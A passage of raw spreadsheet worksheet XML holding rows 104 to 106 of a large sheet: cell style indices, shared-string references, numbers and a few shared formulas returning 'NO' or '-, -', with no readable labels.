      <c r="EK104" s="357">
        <v>46</v>
      </c>
      <c r="EL104" s="357">
        <v>60</v>
      </c>
      <c r="EM104" s="358">
        <v>0</v>
      </c>
      <c r="EN104" s="368" t="str">
        <f t="shared" si="35"/>
        <v>NO</v>
      </c>
      <c r="EO104" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP104" s="369"/>
      <c r="EQ104" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER104" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES104" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET104" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU104" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV104" s="369"/>
      <c r="EW104" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX104" s="369"/>
      <c r="EY104" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ104" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA104" s="369"/>
      <c r="FB104" s="369"/>
      <c r="FC104" s="369">
        <v>1</v>
      </c>
      <c r="FD104" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE104" s="369">
        <v>0</v>
      </c>
      <c r="FF104" s="369">
        <v>0</v>
      </c>
      <c r="FG104" s="369">
        <v>0</v>
      </c>
      <c r="FH104" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI104" s="377" t="str">
        <f t="shared" si="36"/>
        <v>NO</v>
      </c>
      <c r="FJ104" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK104" s="378"/>
      <c r="FL104" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM104" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN104" s="378"/>
      <c r="FO104" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP104" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ104" s="378"/>
      <c r="FR104" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS104" s="380"/>
      <c r="FT104" s="380"/>
      <c r="FU104" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV104" s="378"/>
      <c r="FW104" s="378"/>
      <c r="FX104" s="378">
        <v>1</v>
      </c>
      <c r="FY104" s="378">
        <f t="shared" si="33"/>
        <v>0</v>
      </c>
      <c r="FZ104" s="378">
        <v>0</v>
      </c>
      <c r="GA104" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB104" s="378">
        <v>0</v>
      </c>
      <c r="GC104" s="379" t="s">
        <v>12</v>
      </c>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c r="IW104" s="40"/>
      <c r="IX104" s="40"/>
      <c r="IY104" s="40"/>
      <c r="IZ104" s="40"/>
      <c r="JA104" s="40"/>
      <c r="JB104" s="40"/>
      <c r="JC104" s="40"/>
      <c r="JD104" s="40"/>
      <c r="JE104" s="40"/>
      <c r="JF104" s="40"/>
      <c r="JG104" s="40"/>
      <c r="JH104" s="40"/>
      <c r="JI104" s="40"/>
      <c r="JJ104" s="40"/>
      <c r="JK104" s="40"/>
      <c r="JL104" s="40"/>
      <c r="JM104" s="40"/>
      <c r="JN104" s="40"/>
      <c r="JO104" s="40"/>
      <c r="JP104" s="40"/>
      <c r="JQ104" s="40"/>
      <c r="JR104" s="40"/>
      <c r="JS104" s="40"/>
      <c r="JT104" s="40"/>
      <c r="JU104" s="40"/>
      <c r="JV104" s="40"/>
      <c r="JW104" s="40"/>
      <c r="JX104" s="40"/>
      <c r="JY104" s="40"/>
      <c r="JZ104" s="40"/>
      <c r="KA104" s="40"/>
      <c r="KB104" s="40"/>
      <c r="KC104" s="40"/>
      <c r="KD104" s="40"/>
      <c r="KE104" s="40"/>
      <c r="KF104" s="40"/>
      <c r="KG104" s="40"/>
      <c r="KH104" s="40"/>
      <c r="KI104" s="40"/>
      <c r="KJ104" s="40"/>
      <c r="KK104" s="40"/>
      <c r="KL104" s="40"/>
      <c r="KM104" s="40"/>
      <c r="KN104" s="40"/>
      <c r="KO104" s="40"/>
      <c r="KP104" s="40"/>
      <c r="KQ104" s="40"/>
      <c r="KR104" s="40"/>
      <c r="KS104" s="40"/>
      <c r="KT104" s="40"/>
      <c r="KU104" s="40"/>
      <c r="KV104" s="40"/>
      <c r="KW104" s="40"/>
      <c r="KX104" s="40"/>
      <c r="KY104" s="40"/>
      <c r="KZ104" s="40"/>
      <c r="LA104" s="40"/>
      <c r="LB104" s="40"/>
      <c r="LC104" s="40"/>
      <c r="LD104" s="40"/>
      <c r="LE104" s="40"/>
      <c r="LF104" s="40"/>
      <c r="LG104" s="40"/>
      <c r="LH104" s="40"/>
      <c r="LI104" s="40"/>
    </row>
    <row r="105" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B105" s="224" t="s">
        <v>211</v>
      </c>
      <c r="C105" s="225" t="s">
        <v>375</v>
      </c>
      <c r="D105" s="225" t="s">
        <v>212</v>
      </c>
      <c r="E105" s="225" t="s">
        <v>1586</v>
      </c>
      <c r="F105" s="225">
        <v>53</v>
      </c>
      <c r="G105" s="225" t="s">
        <v>1587</v>
      </c>
      <c r="H105" s="226" t="s">
        <v>12</v>
      </c>
      <c r="I105" s="225"/>
      <c r="J105" s="225" t="s">
        <v>12</v>
      </c>
      <c r="K105" s="227" t="s">
        <v>1626</v>
      </c>
      <c r="L105" s="237" t="s">
        <v>1405</v>
      </c>
      <c r="M105" s="227" t="s">
        <v>1627</v>
      </c>
      <c r="N105" s="227" t="s">
        <v>1628</v>
      </c>
      <c r="O105" s="389"/>
      <c r="P105" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q105" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R105" s="225"/>
      <c r="S105" s="396"/>
      <c r="T105" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U105" s="230" t="s">
        <v>428</v>
      </c>
      <c r="V105" s="231" t="s">
        <v>2603</v>
      </c>
      <c r="W105" s="231"/>
      <c r="X105" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y105" s="255" t="s">
        <v>352</v>
      </c>
      <c r="Z105" s="256" t="s">
        <v>1629</v>
      </c>
      <c r="AA105" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB105" s="256" t="s">
        <v>2505</v>
      </c>
      <c r="AC105" s="226" t="s">
        <v>12</v>
      </c>
      <c r="AD105" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE105" s="259" t="s">
        <v>1632</v>
      </c>
      <c r="AF105" s="270" t="s">
        <v>1630</v>
      </c>
      <c r="AG105" s="225" t="s">
        <v>1631</v>
      </c>
      <c r="AH105" s="271" t="s">
        <v>1594</v>
      </c>
      <c r="AI105" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ105" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK105" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL105" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM105" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN105" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO105" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP105" s="230"/>
      <c r="AQ105" s="230"/>
      <c r="AR105" s="288">
        <v>2</v>
      </c>
      <c r="AS105" s="288">
        <v>1</v>
      </c>
      <c r="AT105" s="288">
        <v>0</v>
      </c>
      <c r="AU105" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV105" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW105" s="288">
        <v>1</v>
      </c>
      <c r="AX105" s="288">
        <v>1</v>
      </c>
      <c r="AY105" s="288">
        <v>0</v>
      </c>
      <c r="AZ105" s="288">
        <f t="shared" si="34"/>
        <v>1</v>
      </c>
      <c r="BA105" s="289"/>
      <c r="BB105" s="301">
        <v>108</v>
      </c>
      <c r="BC105" s="302">
        <v>0</v>
      </c>
      <c r="BD105" s="302" t="s">
        <v>1596</v>
      </c>
      <c r="BE105" s="302">
        <v>4</v>
      </c>
      <c r="BF105" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG105" s="302" t="s">
        <v>1596</v>
      </c>
      <c r="BH105" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI105" s="302" t="s">
        <v>1596</v>
      </c>
      <c r="BJ105" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK105" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL105" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM105" s="302">
        <v>0</v>
      </c>
      <c r="BN105" s="304">
        <v>4</v>
      </c>
      <c r="BO105" s="304">
        <v>0</v>
      </c>
      <c r="BP105" s="304">
        <v>0</v>
      </c>
      <c r="BQ105" s="304">
        <v>0</v>
      </c>
      <c r="BR105" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS105" s="304">
        <v>23</v>
      </c>
      <c r="BT105" s="304">
        <v>0</v>
      </c>
      <c r="BU105" s="304">
        <v>108</v>
      </c>
      <c r="BV105" s="305">
        <v>0</v>
      </c>
      <c r="BW105" s="317">
        <v>138</v>
      </c>
      <c r="BX105" s="319" t="s">
        <v>12</v>
      </c>
      <c r="BY105" s="318" t="s">
        <v>1616</v>
      </c>
      <c r="BZ105" s="318">
        <v>5</v>
      </c>
      <c r="CA105" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB105" s="318" t="s">
        <v>1616</v>
      </c>
      <c r="CC105" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CD105" s="318" t="s">
        <v>1616</v>
      </c>
      <c r="CE105" s="318" t="str">
        <f t="shared" si="27"/>
        <v>-, -</v>
      </c>
      <c r="CF105" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CG105" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CH105" s="319" t="s">
        <v>12</v>
      </c>
      <c r="CI105" s="319">
        <v>0</v>
      </c>
      <c r="CJ105" s="319">
        <v>0</v>
      </c>
      <c r="CK105" s="319">
        <v>0</v>
      </c>
      <c r="CL105" s="319">
        <v>0</v>
      </c>
      <c r="CM105" s="319">
        <f t="shared" si="28"/>
        <v>0</v>
      </c>
      <c r="CN105" s="319">
        <v>23</v>
      </c>
      <c r="CO105" s="319">
        <v>0</v>
      </c>
      <c r="CP105" s="319">
        <v>108</v>
      </c>
      <c r="CQ105" s="319">
        <v>30</v>
      </c>
      <c r="CR105" s="319">
        <v>108</v>
      </c>
      <c r="CS105" s="320">
        <v>0</v>
      </c>
      <c r="CT105" s="339">
        <v>138</v>
      </c>
      <c r="CU105" s="340">
        <v>0</v>
      </c>
      <c r="CV105" s="340" t="s">
        <v>1616</v>
      </c>
      <c r="CW105" s="340">
        <v>5</v>
      </c>
      <c r="CX105" s="340"/>
      <c r="CY105" s="340" t="s">
        <v>1616</v>
      </c>
      <c r="CZ105" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA105" s="340" t="s">
        <v>1616</v>
      </c>
      <c r="DB105" s="340" t="str">
        <f t="shared" si="29"/>
        <v>-, -</v>
      </c>
      <c r="DC105" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD105" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE105" s="340">
        <v>0</v>
      </c>
      <c r="DF105" s="341">
        <v>4</v>
      </c>
      <c r="DG105" s="341">
        <v>0</v>
      </c>
      <c r="DH105" s="341">
        <v>0</v>
      </c>
      <c r="DI105" s="341">
        <v>0</v>
      </c>
      <c r="DJ105" s="341">
        <f t="shared" si="30"/>
        <v>0</v>
      </c>
      <c r="DK105" s="341">
        <v>23</v>
      </c>
      <c r="DL105" s="341">
        <v>0</v>
      </c>
      <c r="DM105" s="341">
        <v>108</v>
      </c>
      <c r="DN105" s="341">
        <v>30</v>
      </c>
      <c r="DO105" s="341">
        <v>108</v>
      </c>
      <c r="DP105" s="342">
        <v>0</v>
      </c>
      <c r="DQ105" s="355">
        <v>204</v>
      </c>
      <c r="DR105" s="356">
        <v>0</v>
      </c>
      <c r="DS105" s="356" t="s">
        <v>1633</v>
      </c>
      <c r="DT105" s="356">
        <v>11</v>
      </c>
      <c r="DU105" s="356"/>
      <c r="DV105" s="356" t="s">
        <v>1633</v>
      </c>
      <c r="DW105" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX105" s="356" t="s">
        <v>1633</v>
      </c>
      <c r="DY105" s="356" t="str">
        <f t="shared" si="31"/>
        <v>-, -</v>
      </c>
      <c r="DZ105" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA105" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB105" s="356">
        <v>0</v>
      </c>
      <c r="EC105" s="357">
        <v>0</v>
      </c>
      <c r="ED105" s="357">
        <v>0</v>
      </c>
      <c r="EE105" s="357">
        <v>0</v>
      </c>
      <c r="EF105" s="357">
        <v>0</v>
      </c>
      <c r="EG105" s="357">
        <f t="shared" si="32"/>
        <v>0</v>
      </c>
      <c r="EH105" s="357">
        <v>35</v>
      </c>
      <c r="EI105" s="357">
        <v>0</v>
      </c>
      <c r="EJ105" s="357">
        <v>108</v>
      </c>
      <c r="EK105" s="357">
        <v>96</v>
      </c>
      <c r="EL105" s="357">
        <v>114</v>
      </c>
      <c r="EM105" s="358">
        <v>0</v>
      </c>
      <c r="EN105" s="368" t="str">
        <f t="shared" si="35"/>
        <v>NO</v>
      </c>
      <c r="EO105" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP105" s="369"/>
      <c r="EQ105" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER105" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES105" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET105" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU105" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV105" s="369"/>
      <c r="EW105" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX105" s="369"/>
      <c r="EY105" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ105" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA105" s="369"/>
      <c r="FB105" s="369"/>
      <c r="FC105" s="369">
        <v>4</v>
      </c>
      <c r="FD105" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE105" s="369">
        <v>0</v>
      </c>
      <c r="FF105" s="369">
        <v>0</v>
      </c>
      <c r="FG105" s="369">
        <v>0</v>
      </c>
      <c r="FH105" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI105" s="377" t="str">
        <f t="shared" si="36"/>
        <v>NO</v>
      </c>
      <c r="FJ105" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK105" s="378"/>
      <c r="FL105" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM105" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN105" s="378"/>
      <c r="FO105" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP105" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ105" s="378"/>
      <c r="FR105" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS105" s="380"/>
      <c r="FT105" s="380"/>
      <c r="FU105" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV105" s="378"/>
      <c r="FW105" s="378"/>
      <c r="FX105" s="378">
        <v>3</v>
      </c>
      <c r="FY105" s="378">
        <f t="shared" si="33"/>
        <v>0</v>
      </c>
      <c r="FZ105" s="378">
        <v>0</v>
      </c>
      <c r="GA105" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB105" s="378">
        <v>0</v>
      </c>
      <c r="GC105" s="379" t="s">
        <v>12</v>
      </c>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c r="IW105" s="40"/>
      <c r="IX105" s="40"/>
      <c r="IY105" s="40"/>
      <c r="IZ105" s="40"/>
      <c r="JA105" s="40"/>
      <c r="JB105" s="40"/>
      <c r="JC105" s="40"/>
      <c r="JD105" s="40"/>
      <c r="JE105" s="40"/>
      <c r="JF105" s="40"/>
      <c r="JG105" s="40"/>
      <c r="JH105" s="40"/>
      <c r="JI105" s="40"/>
      <c r="JJ105" s="40"/>
      <c r="JK105" s="40"/>
      <c r="JL105" s="40"/>
      <c r="JM105" s="40"/>
      <c r="JN105" s="40"/>
      <c r="JO105" s="40"/>
      <c r="JP105" s="40"/>
      <c r="JQ105" s="40"/>
      <c r="JR105" s="40"/>
      <c r="JS105" s="40"/>
      <c r="JT105" s="40"/>
      <c r="JU105" s="40"/>
      <c r="JV105" s="40"/>
      <c r="JW105" s="40"/>
      <c r="JX105" s="40"/>
      <c r="JY105" s="40"/>
      <c r="JZ105" s="40"/>
      <c r="KA105" s="40"/>
      <c r="KB105" s="40"/>
      <c r="KC105" s="40"/>
      <c r="KD105" s="40"/>
      <c r="KE105" s="40"/>
      <c r="KF105" s="40"/>
      <c r="KG105" s="40"/>
      <c r="KH105" s="40"/>
      <c r="KI105" s="40"/>
      <c r="KJ105" s="40"/>
      <c r="KK105" s="40"/>
      <c r="KL105" s="40"/>
      <c r="KM105" s="40"/>
      <c r="KN105" s="40"/>
      <c r="KO105" s="40"/>
      <c r="KP105" s="40"/>
      <c r="KQ105" s="40"/>
      <c r="KR105" s="40"/>
      <c r="KS105" s="40"/>
      <c r="KT105" s="40"/>
      <c r="KU105" s="40"/>
      <c r="KV105" s="40"/>
      <c r="KW105" s="40"/>
      <c r="KX105" s="40"/>
      <c r="KY105" s="40"/>
      <c r="KZ105" s="40"/>
      <c r="LA105" s="40"/>
      <c r="LB105" s="40"/>
      <c r="LC105" s="40"/>
      <c r="LD105" s="40"/>
      <c r="LE105" s="40"/>
      <c r="LF105" s="40"/>
      <c r="LG105" s="40"/>
      <c r="LH105" s="40"/>
      <c r="LI105" s="40"/>
    </row>
    <row r="106" spans="2:321" ht="39.950000000000003" customHeight="1">
      <c r="B106" s="224" t="s">
        <v>211</v>
      </c>
      <c r="C106" s="225" t="s">
        <v>375</v>
      </c>
      <c r="D106" s="225" t="s">
        <v>212</v>
      </c>
      <c r="E106" s="225" t="s">
        <v>1586</v>
      </c>
      <c r="F106" s="225">
        <v>53</v>
      </c>
      <c r="G106" s="225" t="s">
        <v>1587</v>
      </c>
      <c r="H106" s="226" t="s">
        <v>1588</v>
      </c>
      <c r="I106" s="225"/>
      <c r="J106" s="225" t="s">
        <v>1589</v>
      </c>
      <c r="K106" s="227" t="s">
        <v>1634</v>
      </c>
      <c r="L106" s="237" t="s">
        <v>1405</v>
      </c>
      <c r="M106" s="227" t="s">
        <v>1635</v>
      </c>
      <c r="N106" s="227" t="s">
        <v>1636</v>
      </c>
      <c r="O106" s="389"/>
      <c r="P106" s="275" t="s">
        <v>191</v>
      </c>
      <c r="Q106" s="225" t="s">
        <v>191</v>
      </c>
      <c r="R106" s="225"/>
      <c r="S106" s="396"/>
      <c r="T106" s="280" t="s">
        <v>191</v>
      </c>
      <c r="U106" s="230" t="s">
        <v>428</v>
      </c>
      <c r="V106" s="231" t="s">
        <v>2603</v>
      </c>
      <c r="W106" s="231"/>
      <c r="X106" s="232" t="s">
        <v>192</v>
      </c>
      <c r="Y106" s="255" t="s">
        <v>186</v>
      </c>
      <c r="Z106" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AA106" s="257" t="s">
        <v>2410</v>
      </c>
      <c r="AB106" s="256" t="s">
        <v>2505</v>
      </c>
      <c r="AC106" s="226" t="s">
        <v>1637</v>
      </c>
      <c r="AD106" s="258" t="s">
        <v>193</v>
      </c>
      <c r="AE106" s="259" t="s">
        <v>1640</v>
      </c>
      <c r="AF106" s="270" t="s">
        <v>1638</v>
      </c>
      <c r="AG106" s="225" t="s">
        <v>1639</v>
      </c>
      <c r="AH106" s="271" t="s">
        <v>1594</v>
      </c>
      <c r="AI106" s="280" t="s">
        <v>13</v>
      </c>
      <c r="AJ106" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AK106" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AL106" s="229" t="s">
        <v>192</v>
      </c>
      <c r="AM106" s="229" t="s">
        <v>13</v>
      </c>
      <c r="AN106" s="281" t="s">
        <v>192</v>
      </c>
      <c r="AO106" s="287" t="s">
        <v>13</v>
      </c>
      <c r="AP106" s="230"/>
      <c r="AQ106" s="230"/>
      <c r="AR106" s="288">
        <v>13</v>
      </c>
      <c r="AS106" s="288">
        <v>1</v>
      </c>
      <c r="AT106" s="288">
        <v>0</v>
      </c>
      <c r="AU106" s="288">
        <f t="shared" si="24"/>
        <v>1</v>
      </c>
      <c r="AV106" s="256" t="s">
        <v>12</v>
      </c>
      <c r="AW106" s="288">
        <v>1</v>
      </c>
      <c r="AX106" s="288">
        <v>1</v>
      </c>
      <c r="AY106" s="288">
        <v>0</v>
      </c>
      <c r="AZ106" s="288">
        <f t="shared" si="34"/>
        <v>1</v>
      </c>
      <c r="BA106" s="289" t="s">
        <v>1641</v>
      </c>
      <c r="BB106" s="301">
        <v>0</v>
      </c>
      <c r="BC106" s="302">
        <v>0</v>
      </c>
      <c r="BD106" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BE106" s="302">
        <v>0</v>
      </c>
      <c r="BF106" s="303" t="s">
        <v>13</v>
      </c>
      <c r="BG106" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BH106" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BI106" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BJ106" s="302" t="str">
        <f t="shared" si="25"/>
        <v>-, -</v>
      </c>
      <c r="BK106" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BL106" s="302" t="s">
        <v>12</v>
      </c>
      <c r="BM106" s="302">
        <v>0</v>
      </c>
      <c r="BN106" s="304">
        <v>13</v>
      </c>
      <c r="BO106" s="304">
        <v>0</v>
      </c>
      <c r="BP106" s="304">
        <v>0</v>
      </c>
      <c r="BQ106" s="304">
        <v>0</v>
      </c>
      <c r="BR106" s="304">
        <f t="shared" si="26"/>
        <v>0</v>
      </c>
      <c r="BS106" s="304">
        <v>0</v>
      </c>
      <c r="BT106" s="304">
        <v>0</v>
      </c>
      <c r="BU106" s="304">
        <v>0</v>
      </c>
      <c r="BV106" s="305">
        <v>0</v>
      </c>
      <c r="BW106" s="317">
        <v>0</v>
      </c>
      <c r="BX106" s="318">
        <v>0</v>
      </c>
      <c r="BY106" s="318" t="s">
        <v>12</v>
      </c>
      <c r="BZ106" s="318">
        <v>0</v>
      </c>
      <c r="CA106" s="318" t="s">
        <v>13</v>
      </c>
      <c r="CB106" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CC106" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CD106" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CE106" s="318" t="str">
        <f t="shared" si="27"/>
        <v>-, -</v>
      </c>
      <c r="CF106" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CG106" s="318" t="s">
        <v>12</v>
      </c>
      <c r="CH106" s="318">
        <v>0</v>
      </c>
      <c r="CI106" s="319">
        <v>12</v>
      </c>
      <c r="CJ106" s="319">
        <v>0</v>
      </c>
      <c r="CK106" s="319">
        <v>0</v>
      </c>
      <c r="CL106" s="319">
        <v>0</v>
      </c>
      <c r="CM106" s="319">
        <f t="shared" si="28"/>
        <v>0</v>
      </c>
      <c r="CN106" s="319">
        <v>0</v>
      </c>
      <c r="CO106" s="319">
        <v>0</v>
      </c>
      <c r="CP106" s="319">
        <v>0</v>
      </c>
      <c r="CQ106" s="319">
        <v>0</v>
      </c>
      <c r="CR106" s="319">
        <v>0</v>
      </c>
      <c r="CS106" s="320">
        <v>0</v>
      </c>
      <c r="CT106" s="339">
        <v>0</v>
      </c>
      <c r="CU106" s="340">
        <v>0</v>
      </c>
      <c r="CV106" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CW106" s="340">
        <v>0</v>
      </c>
      <c r="CX106" s="340"/>
      <c r="CY106" s="340" t="s">
        <v>12</v>
      </c>
      <c r="CZ106" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DA106" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DB106" s="340" t="str">
        <f t="shared" si="29"/>
        <v>-, -</v>
      </c>
      <c r="DC106" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DD106" s="340" t="s">
        <v>12</v>
      </c>
      <c r="DE106" s="340">
        <v>0</v>
      </c>
      <c r="DF106" s="341">
        <v>13</v>
      </c>
      <c r="DG106" s="341">
        <v>0</v>
      </c>
      <c r="DH106" s="341">
        <v>0</v>
      </c>
      <c r="DI106" s="341">
        <v>0</v>
      </c>
      <c r="DJ106" s="341">
        <f t="shared" si="30"/>
        <v>0</v>
      </c>
      <c r="DK106" s="341">
        <v>0</v>
      </c>
      <c r="DL106" s="341">
        <v>0</v>
      </c>
      <c r="DM106" s="341">
        <v>0</v>
      </c>
      <c r="DN106" s="341">
        <v>0</v>
      </c>
      <c r="DO106" s="341">
        <v>0</v>
      </c>
      <c r="DP106" s="342">
        <v>0</v>
      </c>
      <c r="DQ106" s="355">
        <v>10</v>
      </c>
      <c r="DR106" s="356">
        <v>0</v>
      </c>
      <c r="DS106" s="356" t="s">
        <v>535</v>
      </c>
      <c r="DT106" s="356">
        <v>3</v>
      </c>
      <c r="DU106" s="356"/>
      <c r="DV106" s="356" t="s">
        <v>535</v>
      </c>
      <c r="DW106" s="356" t="s">
        <v>12</v>
      </c>
      <c r="DX106" s="356" t="s">
        <v>535</v>
      </c>
      <c r="DY106" s="356" t="str">
        <f t="shared" si="31"/>
        <v>-, -</v>
      </c>
      <c r="DZ106" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EA106" s="356" t="s">
        <v>12</v>
      </c>
      <c r="EB106" s="356">
        <v>0</v>
      </c>
      <c r="EC106" s="357">
        <v>12</v>
      </c>
      <c r="ED106" s="357">
        <v>4</v>
      </c>
      <c r="EE106" s="357">
        <v>0</v>
      </c>
      <c r="EF106" s="357">
        <v>0</v>
      </c>
      <c r="EG106" s="357">
        <f t="shared" si="32"/>
        <v>0</v>
      </c>
      <c r="EH106" s="357">
        <v>7</v>
      </c>
      <c r="EI106" s="357">
        <v>0</v>
      </c>
      <c r="EJ106" s="357">
        <v>0</v>
      </c>
      <c r="EK106" s="357">
        <v>10</v>
      </c>
      <c r="EL106" s="357">
        <v>10</v>
      </c>
      <c r="EM106" s="358">
        <v>0</v>
      </c>
      <c r="EN106" s="368" t="str">
        <f t="shared" si="35"/>
        <v>NO</v>
      </c>
      <c r="EO106" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EP106" s="369"/>
      <c r="EQ106" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ER106" s="369" t="s">
        <v>12</v>
      </c>
      <c r="ES106" s="369" t="s">
        <v>13</v>
      </c>
      <c r="ET106" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EU106" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EV106" s="369"/>
      <c r="EW106" s="369" t="s">
        <v>12</v>
      </c>
      <c r="EX106" s="369"/>
      <c r="EY106" s="369" t="s">
        <v>13</v>
      </c>
      <c r="EZ106" s="369" t="s">
        <v>12</v>
      </c>
      <c r="FA106" s="369"/>
      <c r="FB106" s="369"/>
      <c r="FC106" s="369">
        <v>13</v>
      </c>
      <c r="FD106" s="369">
        <f t="shared" si="15"/>
        <v>0</v>
      </c>
      <c r="FE106" s="369">
        <v>0</v>
      </c>
      <c r="FF106" s="369">
        <v>0</v>
      </c>
      <c r="FG106" s="369">
        <v>0</v>
      </c>
      <c r="FH106" s="370" t="s">
        <v>12</v>
      </c>
      <c r="FI106" s="377" t="str">
        <f t="shared" si="36"/>
        <v>NO</v>
      </c>
      <c r="FJ106" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FK106" s="378"/>
      <c r="FL106" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FM106" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FN106" s="378"/>
      <c r="FO106" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FP106" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FQ106" s="378"/>
      <c r="FR106" s="380" t="s">
        <v>12</v>
      </c>
      <c r="FS106" s="380"/>
      <c r="FT106" s="380"/>
      <c r="FU106" s="378" t="s">
        <v>12</v>
      </c>
      <c r="FV106" s="378"/>
      <c r="FW106" s="378"/>
      <c r="FX106" s="378">
        <v>12</v>
      </c>
      <c r="FY106" s="378">
        <f t="shared" si="33"/>
        <v>0</v>
      </c>
      <c r="FZ106" s="378">
        <v>0</v>
      </c>
      <c r="GA106" s="378" t="s">
        <v>197</v>
      </c>
      <c r="GB106" s="378">
        <v>0</v>
      </c>
      <c r="GC106" s="379" t="s">
        <v>12</v>
      </c>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c r="IW106" s="40"/>
      <c r="IX106" s="40"/>
      <c r="IY106" s="40"/>
      <c r="IZ106" s="40"/>
      <c r="JA106" s="40"/>
      <c r="JB106" s="40"/>
      <c r="JC106" s="40"/>
      <c r="JD106" s="40"/>
      <c r="JE106" s="40"/>
      <c r="JF106" s="40"/>
      <c r="JG106" s="40"/>
      <c r="JH106" s="40"/>
      <c r="JI106" s="40"/>
      <c r="JJ106" s="40"/>
      <c r="JK106" s="40"/>
      <c r="JL106" s="40"/>
      <c r="JM106" s="40"/>
      <c r="JN106" s="40"/>
      <c r="JO106" s="40"/>
      <c r="JP106" s="40"/>
      <c r="JQ106" s="40"/>
      <c r="JR106" s="40"/>
      <c r="JS106" s="40"/>
      <c r="JT106" s="40"/>
      <c r="JU106" s="40"/>
      <c r="JV106" s="40"/>
      <c r="JW106" s="40"/>
      <c r="JX106" s="40"/>
      <c r="JY106" s="40"/>
      <c r="JZ106" s="40"/>
      <c r="KA106" s="40"/>
      <c r="KB106" s="40"/>
      <c r="KC106" s="40"/>
      <c r="KD106" s="40"/>
      <c r="KE106" s="40"/>
      <c r="KF106" s="40"/>
      <c r="KG106" s="40"/>
